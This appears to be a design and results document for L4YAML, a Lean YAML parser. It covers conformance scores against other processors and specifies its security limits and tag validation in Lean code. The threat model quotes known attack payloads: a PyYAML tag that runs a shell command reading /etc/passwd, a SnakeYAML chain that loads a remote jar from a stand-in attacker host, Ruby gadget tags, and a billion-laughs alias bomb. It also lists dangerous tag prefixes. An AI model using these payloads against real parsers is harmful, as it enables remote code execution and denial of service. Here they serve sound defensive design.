* [`L4YAML/Output/Json.lean`](L4YAML/Output/Json.lean) → `l4yaml-json`
  (Core-Schema JSON; runs on the composed parse so aliases resolve).

Both are pure functions over the existing AST — no parser changes were needed
to *observe* the output (the fixes above were parser/scanner changes, each
carried through the proof corpus).

Every processor — L4YAML's native binaries and all 20 docker testers — is scored
through one harness ([`scripts/matrix_score.py`](scripts/matrix_score.py)) over
the identical 402-test data form, so the numbers are apples-to-apples. On both
axes an error test counts as correct iff the processor rejects it (three error
tests ship a stale `in.json`; matching it would mean accepting invalid YAML).

---

### Results

#### Event and JSON axes (402 tests; 282 carry a JSON oracle)

`correct` = output matches the oracle on valid tests **and** the parser rejects
each error test.

| Processor | Lang | Version | Event (of 402) | JSON (of 282) |
| --- | --- | --- | --- | --- |
| **L4YAML** | **Lean** | **0.5.0** | **402/402 (100%)** | **282/282 (100%)** |
| perl-refparser | Perl | RefParser 0.0.3 | 385/402 (96%) | – |
| c-libfyaml | C | libfyaml 0.7.2 | 382/402 (95%) | 269/282 (95%) |
| perl-pp (YAML::PP) | Perl | 0.03 | 374/402 (93%) | 272/282 (96%) |
| py-ruamel | Python | ruamel.yaml 0.16.10 | 345/402 (86%) | 239/282 (85%) |
| hs-hsyaml | Haskell | HsYAML 0.2.1.0 | 330/402 (82%) † | 272/282 (96%) |
| perl-pplibyaml | Perl | YAML::PP::LibYAML 0.005 | 330/402 (82%) | 236/282 (84%) |
| c-libyaml | C | libyaml 0.2.5 | 330/402 (82%) | – |
| py-pyyaml | Python | PyYAML 5.4.1 | 329/402 (82%) | 224/282 (79%) |
| java-snakeyaml | Java | SnakeYAML 1.29 | 322/402 (80%) | 199/282 (71%) |
| dotnet-yamldotnet | C# | YamlDotNet 11.2.1 | 317/402 (79%) † | 175/282 (62%) |
| js-yaml (npm `yaml`) | JS | 2.0.0-8 | 312/402 (78%) | 268/282 (95%) |
| nim-nimyaml | Nim | NimYAML 0.16.0 | 312/402 (78%) † | – |
| cpp-yamlcpp | C++ | yaml-cpp 0.7.0 | 151/402 (38%) † | – |
| js-jsyaml (npm `js-yaml`) | JS | 4.1.0 | – | 226/282 (80%) |
| perl-xs (YAML::XS) | Perl | 0.83 | – | 222/282 (79%) |
| ruby-psych | Ruby | psych 4.0.1 | – | 221/282 (78%) |
| lua-lyaml | Lua | lyaml 6.2.7 | – | 208/282 (74%) |
| perl-syck (YAML::Syck) | Perl | 1.34 | – | 166/282 (59%) |
| raku-yamlish | Raku | YAMLish 0.0.6 | – | 163/282 (58%) |
| perl-yaml (YAML.pm) | Perl | 1.30 | – | 101/282 (36%) |
| perl-tiny (YAML::Tiny) | Perl | 1.73 | – | 47/282 (17%) |

† These *testers* emit a reduced event format (e.g. no flow indicators or
style/tag detail), which the official matrix runner compensates for by
comparing them against correspondingly reduced expected events (see
§Processor versions); the harness here compares everyone against `test.event`
verbatim, so their scores are understated relative to the matrix's
methodology. A reminder that the event axis measures processor **+ tester**
together.

#### Accept/reject axis (event-capable processors)

This is the axis behind "passes all YAML 1.2.2 tests." L4YAML is the only
processor in this run that is perfect on both halves. (The published matrix's
2022 snapshot records clean accept/reject for the libfyaml and reference-parser
builds *it* tested; the builds shipping in the aggregate image do not reproduce
that — see §Processor versions.)

| Processor | valid accepted | invalid rejected |  |
| --- | --- | --- | --- |
| **L4YAML** | **308/308** | **94/94** | ✓ perfect |
| perl-refparser | 307/308 | 93/94 | |
| hs-hsyaml | 299/308 | 94/94 | |
| c-libfyaml | 303/308 | 85/94 | |
| js-yaml | 303/308 | 81/94 | |
| dotnet-yamldotnet | 298/308 | 83/94 | |
| nim-nimyaml | 303/308 | 76/94 | |
| perl-pp | 292/308 | 82/94 | |
| py-ruamel | 274/308 | 77/94 | |
| c-libyaml | 257/308 | 78/94 | |
| py-pyyaml | 254/308 | 80/94 | |
| java-snakeyaml | 249/308 | 78/94 | |

L4YAML never rejects a valid document (0 false negatives) and never accepts an
invalid one (0 false positives). The mainstream C/Python/Java parsers reject
50-60 valid documents each.

---

### Processor versions

The Version column above comes from the image's own manifest
(`/yaml/info/*.yaml` inside `yamlio/alpine-runtime-all`, built 2021-11-19 —
the latest aggregate published to Docker Hub). Every non-L4YAML number in this
report is a measurement of exactly those builds.

#### How this relates to matrix.yaml.info (and why the numbers differ)

The published matrix is a **January 2022 snapshot**: its tables say "Generated
with yaml-test-suite/data Commit `6e6c296a` 2022-01-17" and it has not been
regenerated since. Comparing it with this report:

* **The test content is *not* stale.** The `data-2022-01-17` tag's tree is
  bit-identical to today's `data` branch head (`6ad3d2c6`; verified —
  `git diff` between the two is empty). The 402 tests scored here are exactly
  the 402 tests the matrix scored.
* **The processor scores *are* stale — a score is a property of a build, not
  of a library.** The matrix records `c-libfyaml-event` at a clean 402/402,
  but the libfyaml **0.7.2** build shipping in the aggregate image scores
  382/402 on the identical tests (6 event diffs, 5 valid documents rejected,
  9 invalid accepted). Spot-checks confirm these are genuine parser behavior,
  not harness artifacts: 0.7.2 drops an escaped trailing tab from a
  double-quoted scalar (`DE56/02`, emits `=VAL "3 trailingtab` for
  `=VAL "3 trailing\t tab`) and accepts tab-as-indentation in flow context
  (`Y79Y/003`). The matrix's run evidently used a different (fixed) libfyaml
  build. Likewise `perl-refparser-event` shows 402/402 on the matrix while
  RefParser 0.0.3 scores 385/402 here — mostly *tester*-side encoding quirks
  (8 diffs write a scalar's trailing space as the literal marker `<SPC>`,
  3 write an escaped tab as `\\␉` instead of `\t`), plus 4 genuine parse
  differences (escaped trailing tabs, `DE56/02-03`; block-literal trailing
  newlines, `JEF9/00,02`), one valid document rejected (`JEF9/01`) and one
  error test accepted (`2G84/00`).
* **Comparison strictness differs for six testers.** The matrix runner
  ([perlpunk/yaml-test-matrix](https://github.com/perlpunk/yaml-test-matrix),
  `bin/compare-framework-tests`) compares cpp-yamlcpp, cpp-rapidyaml,
  rust-yamlrust, dotnet-yamldotnet, nim-nimyaml, and hs-hsyaml against
  *reduced* expected events (flow indicators / quoting style / anchor detail
  stripped, matching what those testers can express); everyone else — libfyaml
  and the reference parser included — is compared verbatim, as all processors
  are here. So for the four of those six present in this table (marked †),
  the matrix's methodology would score them higher than this report does. For
  libfyaml and the reference parser — compared verbatim by both — the gap is
  the build (parser or tester), not the comparison rules.

Practical upshot: published matrix numbers and this report's numbers are both
real measurements of the same 402 tests, but of different builds under
(for six testers) different comparison rules. Per-library comparisons should
always cite the build, as the Results table now does. L4YAML's own numbers are
build-pinned too (v0.5.0), with the difference that its conformance is also
theorem-backed — each parser change lands with the proof corpus re-established,
so the score is a maintained invariant rather than a per-release observation.

---

### Reproducing

```bash
# 1. canonical test data (per-test in.yaml / test.event / in.json / error)
cd yaml-test-suite && git fetch --depth 1 origin data
git archive FETCH_HEAD | tar -x -C /path/to/suite-data

# 2. other processors (one image has them all)
docker pull yamlio/alpine-runtime-all
docker run -d --name yamlall yamlio/alpine-runtime-all tail -f /dev/null

# 3. L4YAML's own numbers, in-repo, no docker:
lake build eventscore
.lake/build/bin/eventscore --suite ../yaml-test-suite            # event + error axes

# 4. the full apples-to-apples table:
lake build l4yaml-event l4yaml-json
python3 scripts/matrix_score.py --data /path/to/suite-data --axis both \
    --l4yaml-event .lake/build/bin/l4yaml-event \
    --l4yaml-json  .lake/build/bin/l4yaml-json \
    --out results.json
```

### Matrix contribution

A `lean` runtime for [yaml-runtimes](https://github.com/yaml/yaml-runtimes) was
added (`docker/lean/`: Dockerfile, testers, build script, `list.yaml` entry).
Because Lean 4 is glibc-based it is a **standalone Debian image**, not part of
the Alpine `alpine-runtime-all` aggregate. The image builds from the published
`nasa-jpl/L4YAML` `main` branch and its in-container testers score identically
to the native binaries (event 402/402, json 282/282).

The matrix is now also self-hosted: on every `v*` version tag this
repository's CI packages the prebuilt testers for the commit under test into
the runtime image, regenerates the full matrix, and publishes it to this
repo's GitHub Pages at `/matrix/` — see [README.md §"L4YAML and the YAML Test
Matrix"](README.md#l4yaml-and-the-yaml-test-matrix).

---

## Security limits and tag validation

*(was `LIMITS.md` — "Parser Security: Limits and Tag Validation"; consolidated into this file 2026-08-01, file-level history in git)*
*(its "Open Questions" and "Future Work" sections were moved to [Security hardening backlog](#security-hardening-backlog) in The Plan below)*

### Overview

This document specifies security mechanisms to prevent **two critical vulnerability classes** in the lean4-yaml-verified parser:

1. **Denial-of-Service (DoS) attacks**: Billion laugh attacks, resource exhaustion, and cyclic structures
2. **Arbitrary code execution (ACE)**: Unsafe tags and directives that could execute code during deserialization

The YAML specification (1.2.2) is inherently unsafe when combined with language-specific tags (e.g., `!!python/object`, `!!ruby/object`). While Lean's purity prevents direct code execution, **tag validation is essential** for:
- **Preventing downstream attacks**: Unsafe tags passed to FFI or external systems
- **Schema enforcement**: Restricting documents to known-safe types
- **Defense in depth**: Rejecting malicious patterns before they reach application code

**Status**: **Implemented** in `L4YAML/Config/Limits.lean` (originally landed as `L4YAML/Limits.lean` in v0.3.0 and moved during the 2026-04 folder reorganization). See `Tests/LimitTests.lean` for 43 passing checks across all limit categories, and `doc/Doc/L4YAML/Security.lean` for the user-facing security chapter.

> Note: code snippets and unqualified file paths below predate the 2026-04
> folder reorganization (bare `Types.lean` is now `L4YAML/Spec/Types.lean`)
> and the 2026-07-31 theorem→lemma rename (non-capstone `theorem`
> declarations are now spelled `lemma`).

### Threat Model

#### 1. Arbitrary Code Execution via Unsafe Tags

**CRITICAL VULNERABILITY**: Language-specific tags can execute arbitrary code during parsing/deserialization.

##### PyYAML Example (Python)
```yaml
!!python/object/apply:os.system
args: ['cat /etc/passwd']
```

When loaded with `yaml.load()` (unsafe mode), this executes `os.system('cat /etc/passwd')`.

##### SnakeYAML Example (Java)
```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/evil.jar"]
  ]]
]
```

Loads and executes remote code via Java's script engine.

##### Ruby Example
```yaml
--- !ruby/object:Gem::Installer
  i: x
--- !ruby/object:Gem::SpecFetcher
  i: y
```

Triggers deserialization gadgets in Ruby's object system.

**Current status in lean4-yaml-verified**:
- Tags are **parsed and preserved** in `Scalar.tag`, `YamlValue.sequence.tag`, `YamlValue.mapping.tag` (`structure Scalar`, `L4YAML/Spec/Types.lean:215`)
- Directives are parsed: `%TAG !handle! prefix` defines custom tag shorthand (`inductive Directive`, `L4YAML/Spec/Types.lean:301`)
- **No validation**: All tags accepted, passed through to application

**Attack surface**:
1. **Direct**: If parser exposes FFI hooks for tag handlers (not currently planned)
2. **Indirect**: Application code deserializes tagged values into unsafe types
3. **Downstream**: Tagged YAML passed to other systems (Python, Java, Ruby) that execute code

**Mitigation required**: Tag validation and whitelisting (see [Tag Security Limits](#4-tag-security-limits) below).

#### 2. Billion Laugh Attack (Entity/Alias Expansion)

The classic XML entity expansion attack, adapted for YAML:

```yaml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h]
```

Each level multiplies the result size by 8. Level 9 (`i`) expands to 8^9 = **134 million** copies of the string `"lol"`, consuming gigabytes of memory from a small input.

**Current vulnerability**: `YamlValue.resolveAliases` (`L4YAML/Spec/Types.lean:481`) recursively expands all aliases without limits. An attacker can craft payloads that exhaust memory or CPU during the `YamlDocument.compose` step (`L4YAML/Spec/Types.lean:676`). This is mitigated by the limit-enforcing variant `resolveAliasesLimited` (`L4YAML/Config/Limits.lean:433`) described below.

#### 3. Other DoS Vectors

- **Deeply nested structures**: Excessive nesting depth can cause stack overflow or quadratic traversal costs
- **Large scalar values**: Multi-gigabyte block scalars can exhaust memory
- **Large collections**: Sequences/mappings with millions of elements consume memory
- **Anchor table bloat**: Excessive anchors consume memory even before resolution
- **Cyclic aliases**: Malformed input with cycles (if not already caught by grammar)
- **Tag handle bombs**: Malicious `%TAG` directives with extremely long prefixes

### Proposed Limits

All limits are **configurable** via a `ParserLimits` structure, with conservative defaults suitable for untrusted input.

#### Limit Categories

##### 1. Alias Expansion Limits

```lean
structure AliasLimits where
  /-- Maximum depth of alias resolution chains.
      Example: if a: &a *b, b: &b *c, c: "x", depth is 3.
      Prevents deeply nested alias chains.
      Default: 50 -/
  maxAliasDepth : Nat := 50

  /-- Maximum total number of alias resolution steps per document.
      Counts each `.alias` node substitution during `resolveAliases`.
      Prevents billion-laugh exponential expansion.
      Default: 10,000 -/
  maxAliasExpansions : Nat := 10_000

  /-- Maximum total size (in nodes) of the document after alias resolution.
      Prevents exponential memory consumption.
      Default: 100,000 nodes -/
  maxResolvedNodes : Nat := 100_000

  /-- Whether to detect and reject cyclic aliases (a: &a [*a]).
      Cyclic aliases violate YAML 1.2.2 §3.2.1 (acyclic graph requirement).
      Default: true -/
  rejectCycles : Bool := true
```

**Implementation strategy**:
- Add a stateful expansion tracker to `resolveAliases` that counts depth and total expansions
- Fail with `.error "alias expansion limit exceeded"` if thresholds are exceeded
- For cycle detection, maintain a `visited : Std.HashSet String` during traversal

##### 2. Structural Limits

```lean
structure StructuralLimits where
  /-- Maximum nesting depth of collections (sequences/mappings).
      Prevents stack overflow and quadratic traversal.
      Default: 100 -/
  maxDepth : Nat := 100

  /-- Maximum number of elements in a single sequence.
      Default: 100,000 -/
  maxSequenceLength : Nat := 100_000

  /-- Maximum number of key-value pairs in a single mapping.
      Default: 100,000 -/
  maxMappingSize : Nat := 100_000

  /-- Maximum length of a scalar value (in bytes).
      Default: 10 MB -/
  maxScalarBytes : Nat := 10_485_760

  /-- Maximum total number of nodes across all documents in a stream.
      Default: 1,000,000 -/
  maxTotalNodes : Nat := 1_000_000
```

**Implementation strategy**:
- Nesting depth: track current depth in parser state, increment/decrement on collection entry/exit
- Collection sizes: check `Array.size` after parsing sequences/mappings
- Scalar bytes: check `String.utf8ByteSize` after constructing block/flow scalars
- Total nodes: increment counter in `YamlStream` during parse, check at document boundaries

##### 3. Document-Level Limits

```lean
structure DocumentLimits where
  /-- Maximum number of documents in a stream.
      Default: 100 -/
  maxDocuments : Nat := 100

  /-- Maximum number of anchors per document.
      Default: 10,000 -/
  maxAnchors : Nat := 10_000

  /-- Maximum total input size (in bytes).
      Default: 100 MB -/
  maxInputBytes : Nat := 104_857_600
```

**Implementation strategy**:
- Document count: check `Array.size` in `parseStream` before adding each document
- Anchor count: check `AnchorMap.size` when inserting anchors
- Input size: validate `String.utf8ByteSize` at entry to `parseYaml`

##### 4. Tag Security Limits

**CRITICAL FOR SECURITY**: Control which YAML tags are accepted to prevent code execution attacks.

```lean
/-- Tag validation policy -/
inductive TagPolicy where
  /-- Accept all tags (UNSAFE - only for trusted input) -/
  | allowAll
  /-- Reject all explicit tags, only allow implicit typing (SAFE DEFAULT) -/
  | rejectAll
  /-- Whitelist: only accept tags in the allowed list -/
  | whitelist (allowed : List String)
  /-- Blacklist: reject tags in the forbidden list -/
  | blacklist (forbidden : List String)
  /-- Schema-based: only accept tags defined in YAML 1.2 Core Schema -/
  | coreSchemaOnly
  deriving Repr, BEq, Inhabited

structure TagLimits where
  /-- Tag validation policy.
      Default: coreSchemaOnly (!!str, !!int, !!float, !!bool, !!null, !!seq, !!map) -/
  policy : TagPolicy := .coreSchemaOnly

  /-- Whether to reject language-specific tags (!!python/*, !!java/*, !!ruby/*, etc.).
      Default: true -/
  rejectLanguageTags : Bool := true

  /-- Maximum length of a tag string (in bytes).
      Prevents tag handle bombs: `%TAG ! http://extremely-long-url.com/...`
      Default: 1024 bytes -/
  maxTagLength : Nat := 1_024

  /-- Maximum number of unique tags per document.
      Prevents tag table bloat attacks.
      Default: 100 -/
  maxUniqueTags : Nat := 100

  /-- Whether to reject custom tag handles (%TAG directives).
      Default: false (allow %TAG but validate expanded tags) -/
  rejectCustomHandles : Bool := false

  /-- Maximum length of tag handle prefix.
      Prevents malicious %TAG directives: `%TAG ! http://attacker.com/`
      Default: 256 bytes -/
  maxHandlePrefixLength : Nat := 256
```

**YAML 1.2 Core Schema Safe Tags** (whitelist when `policy = .coreSchemaOnly`):
```lean
def coreSchemaWhitelist : List String :=
  [ "tag:yaml.org,2002:str"      -- !!str: Unicode strings
  , "tag:yaml.org,2002:int"      -- !!int: Integers
  , "tag:yaml.org,2002:float"    -- !!float: Floating point
  , "tag:yaml.org,2002:bool"     -- !!bool: true/false
  , "tag:yaml.org,2002:null"     -- !!null: null/empty
  , "tag:yaml.org,2002:seq"      -- !!seq: Sequences (arrays)
  , "tag:yaml.org,2002:map"      -- !!map: Mappings (objects)
  , "tag:yaml.org,2002:binary"   -- !!binary: Base64-encoded binary
  , "tag:yaml.org,2002:timestamp" -- !!timestamp: ISO 8601 timestamps
  ]
```

**Dangerous Tag Patterns** (blacklist when `rejectLanguageTags = true`):
```lean
def dangerousTagPrefixes : List String :=
  [ "tag:yaml.org,2002:python/"  -- Python object deserialization
  , "!!python/"                  -- Python shorthand
  , "tag:yaml.org,2002:java/"    -- Java object deserialization
  , "!!java/"                    -- Java shorthand
  , "tag:yaml.org,2002:ruby/"    -- Ruby object deserialization
  , "!!ruby/"                    -- Ruby shorthand
  , "tag:yaml.org,2002:php/"     -- PHP object deserialization
  , "!!php/"                     -- PHP shorthand
  , "tag:yaml.org,2002:perl/"    -- Perl object deserialization
  , "!!perl/"                    -- Perl shorthand
  ]
```

**Real-world attack examples**:
- `!!python/object/apply:os.system` — Execute shell commands (PyYAML)
- `!!python/object/new:subprocess.Popen` — Spawn processes (PyYAML)
- `!!java.net.URLClassLoader` — Load remote classes (SnakeYAML)
- `!!javax.script.ScriptEngineManager` — Execute scripts (SnakeYAML)
- `!!ruby/object:Gem::Installer` — Ruby deserialization gadgets

**Implementation strategy**:
- Tag validation: Check all explicit tags during parse against policy
- Handle expansion: Validate `%TAG` directive prefixes before storing
- Tag length: Check `String.utf8ByteSize` when parsing tags
- Unique tag tracking: Maintain `HashSet String` of seen tags per document
- Pattern matching: For blacklist/whitelist, use `String.isPrefixOf` or regex

**Example usage**:

```lean
-- Safe configuration for untrusted input (web APIs, user uploads)
def strictTagPolicy : TagLimits := {
  policy := .coreSchemaOnly
  rejectLanguageTags := true
  maxTagLength := 256
  maxUniqueTags := 20
  rejectCustomHandles := true  -- Reject all %TAG directives
}

-- Moderate configuration (config files from known sources)
def permissiveTagPolicy : TagLimits := {
  policy := .whitelist [
    "tag:yaml.org,2002:str", "tag:yaml.org,2002:int",
    "tag:yaml.org,2002:float", "tag:yaml.org,2002:bool",
    "tag:yaml.org,2002:null", "tag:yaml.org,2002:seq",
    "tag:yaml.org,2002:map",
    "!myapp/user", "!myapp/config"  -- Application-specific tags
  ]
  rejectLanguageTags := true
  rejectCustomHandles := false  -- Allow %TAG for app-specific tags
}

-- Unsafe configuration (trusted internal use ONLY)
def unsafeTagPolicy : TagLimits := {
  policy := .allowAll
  rejectLanguageTags := false
}
```

#### Combined Limits Structure

```lean
structure ParserLimits where
  alias : AliasLimits := {}
  structural : StructuralLimits := {}
  document : DocumentLimits := {}
  tag : TagLimits := {}

  /-- Whether to enforce limits at all. Setting to `false` disables all checks.
      Default: true -/
  enabled : Bool := true
  deriving Repr, BEq, Inhabited
```

#### Predefined Configurations

```lean
namespace ParserLimits

/-- Conservative limits for untrusted input (web APIs, user uploads).
    10x stricter than defaults + strict tag validation. -/
def strict : ParserLimits := {
  alias := { maxAliasDepth := 20, maxAliasExpansions := 1_000, maxResolvedNodes := 10_000 }
  structural := { maxDepth := 50, maxSequenceLength := 10_000, maxMappingSize := 10_000,
                   maxScalarBytes := 1_048_576, maxTotalNodes := 100_000 }
  document := { maxDocuments := 10, maxAnchors := 1_000, maxInputBytes := 10_485_760 }
  tag := { policy := .coreSchemaOnly, rejectLanguageTags := true,
           maxTagLength := 256, maxUniqueTags := 20, rejectCustomHandles := true }
}

/-- Permissive limits for trusted internal use (config files, test suites).
    100x more generous than defaults + relaxed tag validation. -/
def permissive : ParserLimits := {
  alias := { maxAliasDepth := 500, maxAliasExpansions := 1_000_000, maxResolvedNodes := 10_000_000 }
  structural := { maxDepth := 1000, maxSequenceLength := 10_000_000, maxMappingSize := 10_000_000,
                   maxScalarBytes := 1_073_741_824, maxTotalNodes := 100_000_000 }
  document := { maxDocuments := 10_000, maxAnchors := 1_000_000, maxInputBytes := 10_737_418_240 }
  tag := { policy := .coreSchemaOnly, rejectLanguageTags := true,
           maxTagLength := 1024, maxUniqueTags := 1000, rejectCustomHandles := false }
}

/-- Unlimited mode for verification/testing. All checks disabled.
    WARNING: Do not use with untrusted input. ALLOWS ALL TAGS. -/
def unlimited : ParserLimits := { enabled := false }

/-- Safe mode: No resource limits, but strict tag validation.
    Use when performance is not a concern but security is. -/
def safeTagsOnly : ParserLimits := {
  enabled := true
  alias := { maxAliasDepth := 10_000, maxAliasExpansions := 10_000_000,
             maxResolvedNodes := 100_000_000, rejectCycles := true }
  structural := { maxDepth := 10_000, maxSequenceLength := 100_000_000,
                  maxMappingSize := 100_000_000, maxScalarBytes := 10_737_418_240,
                  maxTotalNodes := 1_000_000_000 }
  document := { maxDocuments := 100_000, maxAnchors := 10_000_000,
                maxInputBytes := 10_737_418_240 }
  tag := { policy := .coreSchemaOnly, rejectLanguageTags := true,
           maxTagLength := 256, maxUniqueTags := 100, rejectCustomHandles := true }
}

end ParserLimits
```

### Error Types

All limit violations are reported through structured inductive error types, enabling precise error handling and pattern matching.

#### Error Hierarchy

```lean
/-! ## Alias Expansion Errors -/

/-- Errors that can occur during alias resolution -/
inductive AliasLimitError where
  /-- Cyclic alias reference detected: `a: &a [*a]` -/
  | cyclicAlias (name : String) (path : List String)
  /-- Alias resolution depth exceeded -/
  | depthExceeded (depth : Nat) (limit : Nat) (aliasName : String)
  /-- Total number of alias expansions exceeded -/
  | expansionCountExceeded (count : Nat) (limit : Nat)
  /-- Total number of nodes after resolution exceeded -/
  | nodeCountExceeded (count : Nat) (limit : Nat)
  deriving Repr, BEq, Inhabited

namespace AliasLimitError

def toString : AliasLimitError → String
  | cyclicAlias name path =>
    s!"Cyclic alias detected: '{name}' (resolution path: {" → ".intercalate path})"
  | depthExceeded depth limit aliasName =>
    s!"Alias resolution depth exceeded: {depth} > {limit} (resolving '{aliasName}')"
  | expansionCountExceeded count limit =>
    s!"Alias expansion count exceeded: {count} > {limit}"
  | nodeCountExceeded count limit =>
    s!"Resolved node count exceeded: {count} > {limit}"

instance : ToString AliasLimitError where
  toString := toString

end AliasLimitError

/-! ## Structural Limit Errors -/

/-- Errors for structural limits (depth, collection sizes, scalar sizes) -/
inductive StructuralLimitError where
  /-- Collection nesting depth exceeded -/
  | depthExceeded (depth : Nat) (limit : Nat) (path : YamlPath)
  /-- Sequence length exceeded -/
  | sequenceTooLarge (length : Nat) (limit : Nat) (path : YamlPath)
  /-- Mapping size exceeded -/
  | mappingTooLarge (size : Nat) (limit : Nat) (path : YamlPath)
  /-- Scalar value too large -/
  | scalarTooLarge (bytes : Nat) (limit : Nat) (path : YamlPath)
  /-- Total node count across all documents exceeded -/
  | totalNodesExceeded (count : Nat) (limit : Nat)
  deriving Repr, BEq, Inhabited

namespace StructuralLimitError

def toString : StructuralLimitError → String
  | depthExceeded depth limit path =>
    s!"Nesting depth exceeded: {depth} > {limit} at {pathToString path}"
  | sequenceTooLarge length limit path =>
    s!"Sequence too large: {length} elements > {limit} at {pathToString path}"
  | mappingTooLarge size limit path =>
    s!"Mapping too large: {size} pairs > {limit} at {pathToString path}"
  | scalarTooLarge bytes limit path =>
    s!"Scalar too large: {bytes} bytes > {limit} at {pathToString path}"
  | totalNodesExceeded count limit =>
    s!"Total node count exceeded: {count} > {limit}"
where
  pathToString : YamlPath → String
    | #[] => "root"
    | path => path.foldl (fun acc seg =>
        match seg with
        | .index i => s!"{acc}[{i}]"
        | .key k => s!"{acc}.{k}") ""

instance : ToString StructuralLimitError where
  toString := toString

end StructuralLimitError

/-! ## Document-Level Errors -/

/-- Errors for document-level limits (stream size, anchor count) -/
inductive DocumentLimitError where
  /-- Too many documents in stream -/
  | tooManyDocuments (count : Nat) (limit : Nat)
  /-- Too many anchors in a single document -/
  | tooManyAnchors (count : Nat) (limit : Nat) (docIndex : Nat)
  /-- Input size exceeded -/
  | inputTooLarge (bytes : Nat) (limit : Nat)
  deriving Repr, BEq, Inhabited

namespace DocumentLimitError

def toString : DocumentLimitError → String
  | tooManyDocuments count limit =>
    s!"Too many documents in stream: {count} > {limit}"
  | tooManyAnchors count limit docIndex =>
    s!"Too many anchors in document {docIndex}: {count} > {limit}"
  | inputTooLarge bytes limit =>
    s!"Input too large: {bytes} bytes > {limit}"

instance : ToString DocumentLimitError where
  toString := toString

end DocumentLimitError

/-! ## Tag Security Errors -/

/-- Errors for tag validation and security violations.
    These are CRITICAL security errors that may indicate attack attempts. -/
inductive TagSecurityError where
  /-- Forbidden tag detected (not in whitelist, or in blacklist) -/
  | forbiddenTag (tag : String) (reason : String)
  /-- Dangerous language-specific tag detected -/
  | dangerousLanguageTag (tag : String) (language : String)
  /-- Tag length exceeded -/
  | tagTooLong (bytes : Nat) (limit : Nat) (tag : String)
  /-- Too many unique tags in document -/
  | tooManyUniqueTags (count : Nat) (limit : Nat)
  /-- Custom tag handle rejected -/
  | customHandleRejected (handle : String) (prefix : String)
  /-- Tag handle prefix too long -/
  | handlePrefixTooLong (bytes : Nat) (limit : Nat) (prefix : String)
  /-- Tag not in Core Schema when coreSchemaOnly policy active -/
  | nonCoreSchemaTag (tag : String)
  deriving Repr, BEq, Inhabited

namespace TagSecurityError

def toString : TagSecurityError → String
  | forbiddenTag tag reason =>
    s!"SECURITY: Forbidden tag '{tag}': {reason}"
  | dangerousLanguageTag tag language =>
    s!"SECURITY: Dangerous {language} tag '{tag}' - potential code execution"
  | tagTooLong bytes limit tag =>
    s!"SECURITY: Tag too long: {bytes} bytes > {limit} (tag: {tag.take 50}...)"
  | tooManyUniqueTags count limit =>
    s!"SECURITY: Too many unique tags: {count} > {limit}"
  | customHandleRejected handle prefix =>
    s!"SECURITY: Custom tag handle rejected: {handle} → {prefix}"
  | handlePrefixTooLong bytes limit prefix =>
    s!"SECURITY: Tag handle prefix too long: {bytes} bytes > {limit} (prefix: {prefix.take 50}...)"
  | nonCoreSchemaTag tag =>
    s!"SECURITY: Non-Core-Schema tag '{tag}' (only !!str, !!int, !!float, !!bool, !!null, !!seq, !!map, !!binary, !!timestamp allowed)"

/-- Extract language name from dangerous tag for error reporting -/
def extractLanguage (tag : String) : String :=
  if tag.startsWith "tag:yaml.org,2002:python/" || tag.startsWith "!!python/" then "Python"
  else if tag.startsWith "tag:yaml.org,2002:java/" || tag.startsWith "!!java/" then "Java"
  else if tag.startsWith "tag:yaml.org,2002:ruby/" || tag.startsWith "!!ruby/" then "Ruby"
  else if tag.startsWith "tag:yaml.org,2002:php/" || tag.startsWith "!!php/" then "PHP"
  else if tag.startsWith "tag:yaml.org,2002:perl/" || tag.startsWith "!!perl/" then "Perl"
  else "unknown"

instance : ToString TagSecurityError where
  toString := toString

end TagSecurityError

/-! ## Composite Limit Error -/

/-- Top-level error type for all limit violations -/
inductive LimitError where
  | aliasLimit (err : AliasLimitError)
  | structuralLimit (err : StructuralLimitError)
  | documentLimit (err : DocumentLimitError)
  | tagSecurity (err : TagSecurityError)
  deriving Repr, BEq, Inhabited

namespace LimitError

def toString : LimitError → String
  | aliasLimit err => s!"Alias limit violation: {err}"
  | structuralLimit err => s!"Structural limit violation: {err}"
  | documentLimit err => s!"Document limit violation: {err}"
  | tagSecurity err => s!"{err}"  -- Already prefixed with "SECURITY:"

instance : ToString LimitError where
  toString := toString

/-- Convenience constructors -/
def cyclicAlias (name : String) (path : List String) : LimitError :=
  .aliasLimit (.cyclicAlias name path)

def aliasDepthExceeded (depth limit : Nat) (name : String) : LimitError :=
  .aliasLimit (.depthExceeded depth limit name)

def tooManyExpansions (count limit : Nat) : LimitError :=
  .aliasLimit (.expansionCountExceeded count limit)

def tooManyResolvedNodes (count limit : Nat) : LimitError :=
  .aliasLimit (.nodeCountExceeded count limit)

def nestingTooDeep (depth limit : Nat) (path : YamlPath) : LimitError :=
  .structuralLimit (.depthExceeded depth limit path)

def sequenceTooLarge (length limit : Nat) (path : YamlPath) : LimitError :=
  .structuralLimit (.sequenceTooLarge length limit path)

def mappingTooLarge (size limit : Nat) (path : YamlPath) : LimitError :=
  .structuralLimit (.mappingTooLarge size limit path)

def scalarTooLarge (bytes limit : Nat) (path : YamlPath) : LimitError :=
  .structuralLimit (.scalarTooLarge bytes limit path)

def totalNodesExceeded (count limit : Nat) : LimitError :=
  .structuralLimit (.totalNodesExceeded count limit)

def tooManyDocuments (count limit : Nat) : LimitError :=
  .documentLimit (.tooManyDocuments count limit)

def tooManyAnchors (count limit : Nat) (docIndex : Nat) : LimitError :=
  .documentLimit (.tooManyAnchors count limit docIndex)

def inputTooLarge (bytes limit : Nat) : LimitError :=
  .documentLimit (.inputTooLarge bytes limit)

def forbiddenTag (tag : String) (reason : String) : LimitError :=
  .tagSecurity (.forbiddenTag tag reason)

def dangerousLanguageTag (tag : String) : LimitError :=
  .tagSecurity (.dangerousLanguageTag tag (TagSecurityError.extractLanguage tag))

def tagTooLong (bytes limit : Nat) (tag : String) : LimitError :=
  .tagSecurity (.tagTooLong bytes limit tag)

def tooManyUniqueTags (count limit : Nat) : LimitError :=
  .tagSecurity (.tooManyUniqueTags count limit)

